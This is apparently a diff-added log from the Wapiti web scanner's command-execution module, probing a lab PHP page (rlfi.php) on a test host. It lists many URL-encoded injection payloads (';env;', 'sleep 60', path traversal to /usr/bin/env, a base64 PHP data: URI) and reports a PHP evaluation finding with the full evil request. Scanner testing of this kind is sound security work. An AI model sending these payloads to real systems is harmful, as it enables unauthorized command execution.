+2024-03-20 16:55:47.672 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=env (1)
+2024-03-20 16:55:47.680 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%2Fe%00 (1)
+2024-03-20 16:55:47.689 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
+2024-03-20 16:55:47.701 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
+2024-03-20 16:55:47.716 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
+2024-03-20 16:55:47.732 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
+2024-03-20 16:55:47.748 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
+2024-03-20 16:55:47.764 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
+2024-03-20 16:55:47.776 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
+2024-03-20 16:55:47.786 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
+2024-03-20 16:55:47.794 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
+2024-03-20 16:55:47.803 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
+2024-03-20 16:55:47.811 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
+2024-03-20 16:55:47.819 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
+2024-03-20 16:55:47.826 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (1)
+2024-03-20 16:55:47.892 | RED      | wapitiCore.attack.mod_exec:attack:202 - ---
+2024-03-20 16:55:47.893 | RED      | wapitiCore.attack.mod_exec:attack:203 - PHP evaluation in http://web/rlfi.php via injection in the parameter language
+2024-03-20 16:55:47.893 | RED      | wapitiCore.attack.mod_exec:attack:209 - Evil request:
+2024-03-20 16:55:47.893 | RED      | wapitiCore.attack.mod_exec:attack:210 -     GET /rlfi.php?action=go&language=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: security_level=0
+2024-03-20 16:55:47.893 | RED      | wapitiCore.attack.mod_exec:attack:211 - ---
+2024-03-20 16:55:47.903 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php (1)
+2024-03-20 16:55:47.916 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109
+2024-03-20 16:55:47.920 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%3Benv%3B&bug=109
+2024-03-20 16:55:47.931 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%7Cenv%7C&bug=109
+2024-03-20 16:55:47.938 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=a%3Benv%3B&bug=109
+2024-03-20 16:55:47.946 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=a%3Benv%3B&bug=109
+2024-03-20 16:55:47.955 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&bug=109
+2024-03-20 16:55:47.963 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%3Benv%3B&bug=109
+2024-03-20 16:55:47.971 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%0Aenv%3B&bug=109
+2024-03-20 16:55:47.978 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%26set%26&bug=109
+2024-03-20 16:55:47.986 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=set&bug=109
+2024-03-20 16:55:47.994 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=env&bug=109
+2024-03-20 16:55:48.002 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2Fe%00&bug=109
+2024-03-20 16:55:48.010 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=109
+2024-03-20 16:55:48.019 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=109
+2024-03-20 16:55:48.026 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=109
+2024-03-20 16:55:48.035 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=109
+2024-03-20 16:55:48.042 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=109
+2024-03-20 16:55:48.054 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=109
+2024-03-20 16:55:48.065 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=109
+2024-03-20 16:55:48.077 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=109
+2024-03-20 16:55:48.089 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=109
+2024-03-20 16:55:48.101 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=109
+2024-03-20 16:55:48.114 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=109
+2024-03-20 16:55:48.126 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=109
+2024-03-20 16:55:48.138 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&bug=109
+2024-03-20 16:55:48.150 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=a%60%29%60&bug=109
+2024-03-20 16:55:48.162 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=a%60sleep%2060%60&bug=109
+2024-03-20 16:55:48.176 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=a%3Bsleep%2060%3B&bug=109
+2024-03-20 16:55:48.189 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=a%7Csleep%2060%3B&bug=109
+2024-03-20 16:55:48.202 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%26ping%20-n%2025%20127.0.0.1%26&bug=109
+2024-03-20 16:55:48.216 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%3Benv%3B
+2024-03-20 16:55:48.228 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%7Cenv%7C
+2024-03-20 16:55:48.242 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=a%3Benv%3B
+2024-03-20 16:55:48.256 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=a%3Benv%3B
+2024-03-20 16:55:48.270 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 16:55:48.285 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%3Benv%3B
+2024-03-20 16:55:48.298 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%0Aenv%3B
+2024-03-20 16:55:48.311 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%26set%26
+2024-03-20 16:55:48.322 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=set
+2024-03-20 16:55:48.336 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=env
+2024-03-20 16:55:48.348 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%2Fe%00
+2024-03-20 16:55:48.362 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:48.376 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:48.389 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:48.403 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:48.416 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:48.430 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:48.445 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:48.458 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:48.471 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:48.484 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:48.496 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:48.509 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:48.523 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 16:55:48.537 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=a%60%29%60
+2024-03-20 16:55:48.551 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=a%60sleep%2060%60
+2024-03-20 16:55:48.566 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=a%3Bsleep%2060%3B
+2024-03-20 16:55:48.579 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=a%7Csleep%2060%3B
+2024-03-20 16:55:48.591 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 16:55:48.612 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:55:48.616 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%3Benv%3B&security_level=2
+2024-03-20 16:55:48.628 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%7Cenv%7C&security_level=2
+2024-03-20 16:55:48.639 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=a%3Benv%3B&security_level=2
+2024-03-20 16:55:48.651 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=a%3Benv%3B&security_level=2
+2024-03-20 16:55:48.663 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&security_level=2
+2024-03-20 16:55:48.677 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%3Benv%3B&security_level=2
+2024-03-20 16:55:48.690 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%0Aenv%3B&security_level=2
+2024-03-20 16:55:48.704 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%26set%26&security_level=2
+2024-03-20 16:55:48.718 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=set&security_level=2
+2024-03-20 16:55:48.731 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=env&security_level=2
+2024-03-20 16:55:48.745 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%2Fe%00&security_level=2
+2024-03-20 16:55:48.758 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:55:48.772 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:55:48.785 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:55:48.797 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:55:48.809 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:55:48.822 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:55:48.836 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:55:48.849 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:55:48.861 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:55:48.873 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:55:48.886 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:55:48.901 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:55:48.913 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&security_level=2
+2024-03-20 16:55:48.926 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=a%60%29%60&security_level=2
+2024-03-20 16:55:48.938 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=a%60sleep%2060%60&security_level=2
+2024-03-20 16:55:48.951 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=a%3Bsleep%2060%3B&security_level=2
+2024-03-20 16:55:48.963 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=a%7Csleep%2060%3B&security_level=2
+2024-03-20 16:55:48.975 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%26ping%20-n%2025%20127.0.0.1%26&security_level=2
+2024-03-20 16:55:48.990 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%3Benv%3B
+2024-03-20 16:55:49.003 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%7Cenv%7C
+2024-03-20 16:55:49.015 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=a%3Benv%3B
+2024-03-20 16:55:49.028 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=a%3Benv%3B
+2024-03-20 16:55:49.040 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 16:55:49.052 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%3Benv%3B
+2024-03-20 16:55:49.065 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%0Aenv%3B
+2024-03-20 16:55:49.077 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%26set%26
+2024-03-20 16:55:49.088 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=set
+2024-03-20 16:55:49.101 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=env
+2024-03-20 16:55:49.113 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%2Fe%00
+2024-03-20 16:55:49.126 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:49.138 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:49.150 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:49.163 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:49.174 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:49.187 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:49.199 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:49.212 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:49.225 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:49.238 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:49.252 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:49.264 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:49.278 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 16:55:49.291 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=a%60%29%60
+2024-03-20 16:55:49.304 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=a%60sleep%2060%60
+2024-03-20 16:55:49.316 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=a%3Bsleep%2060%3B
+2024-03-20 16:55:49.328 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=a%7Csleep%2060%3B
+2024-03-20 16:55:49.341 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 16:55:49.381 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 16:55:49.401 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?language=fuzz&action=go (0)
